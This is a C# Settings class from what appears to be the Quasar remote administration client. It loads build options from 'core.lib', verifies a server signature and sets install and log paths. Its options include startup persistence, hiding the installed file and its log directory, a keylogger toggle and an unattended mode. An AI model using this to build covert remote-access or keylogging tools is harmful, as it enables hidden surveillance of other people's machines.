using Quasar.Common;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
namespace Quasar.Client
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {

        public static X509Certificate2 SERVERCERTIFICATE;
        public static string INSTALLPATH;
        public static string LOGSPATH;

        public static string ENCRYPTIONKEY => _options.EncryptionKey;
        public static string SERVERSIGNATURE => _options.ServerSignature;
        public static string VERSION => _options.Version;
        public static string HOSTS => _options.RawHosts;
        public static string SUBDIRECTORY => _options.InstallSub;
        public static string LOGDIRECTORYNAME => _options.LogDirectoryName;
        public static string INSTALLNAME => _options.InstallName;
        public static string MUTEX => _options.Mutex;
        public static string STARTUPKEY => _options.StartupName;
        public static string TAG => _options.Tag;
        public static int RECONNECTDELAY => _options.Delay;
        public static Environment.SpecialFolder SPECIALFOLDER => _options.SpecialFolder;
        public static string DIRECTORY => Environment.GetFolderPath(SPECIALFOLDER);
        public static bool INSTALL => _options.Install;
        public static bool STARTUP => _options.Startup;
        public static bool HIDEFILE => _options.HideFile;
        public static bool ENABLELOGGER => _options.Keylogger;
        public static bool HIDELOGDIRECTORY => _options.HideLogDirectory;
        public static bool HIDEINSTALLSUBDIRECTORY => _options.HideInstallSubdirectory;
        public static bool UNATTENDEDMODE => _options.UnattendedMode;
        private static BuildOptions _options;
        public static bool Initialize()
        {
            _options=BuildOptions.FromBinary(File.ReadAllBytes("core.lib"));
            if (string.IsNullOrEmpty(_options.Version)) return false;
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(_options.ServerCertificate));
            SetupPaths();
            return VerifyHash();
        }

        private static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        private static bool VerifyHash()
        {
            try
            {
                var rsa = SERVERCERTIFICATE.GetRSAPublicKey();
                return rsa.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(_options.EncryptionKey)), Convert.FromBase64String(_options.ServerSignature),
                    HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
